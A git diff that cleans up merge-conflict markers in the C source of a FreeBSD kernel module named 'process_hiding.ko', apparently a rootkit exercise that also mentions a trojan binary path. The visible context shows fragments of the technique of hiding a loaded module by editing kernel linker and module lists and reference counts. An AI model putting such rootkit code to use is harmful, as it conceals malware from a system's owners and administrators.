@@ -29,13 +29,7 @@
 
 #include <sys/queue.h>
 #include <sys/sx.h>
-<<<<<<< HEAD
-=======
 
-
-// #include <dirent.h>
-
->>>>>>> 8268c94fa748995fb46e8da2f5db482f1adaf21f
 
 // #define ORIGINAL	"/sbin/hello"
 // #define TROJAN		"/sbin/trojan_hello"
@@ -43,11 +37,8 @@
 #define VERSION		"process_hiding.ko"
 
 extern linker_file_list_t linker_files;
-<<<<<<< HEAD
 //extern struct mtx kld_mtx;
-=======
-// extern struct mtx kld_mtx;
->>>>>>> 8268c94fa748995fb46e8da2f5db482f1adaf21f
+
 extern int next_file_id;
 
 typedef TAILQ_HEAD(, module) modulelist_t;
@@ -125,11 +116,7 @@ load(struct module *module, int cmd, void *arg)
 		struct module *mod;
 
 		mtx_lock(&Giant);
-<<<<<<< HEAD
 		//mtx_lock(&kld_mtx);
-=======
-		// mtx_lock(&kld_mtx);
->>>>>>> 8268c94fa748995fb46e8da2f5db482f1adaf21f
 
 		/* Decrement the current kernel image's reference count. */
 		// Got to do it twice?!
@@ -147,11 +134,8 @@ load(struct module *module, int cmd, void *arg)
 			}
 		}
 
-<<<<<<< HEAD
 		//mtx_unlock(&kld_mtx);
-=======
-		// mtx_unlock(&kld_mtx);
->>>>>>> 8268c94fa748995fb46e8da2f5db482f1adaf21f
+
 		mtx_unlock(&Giant);
 
 		sx_xlock(&modules_sx);
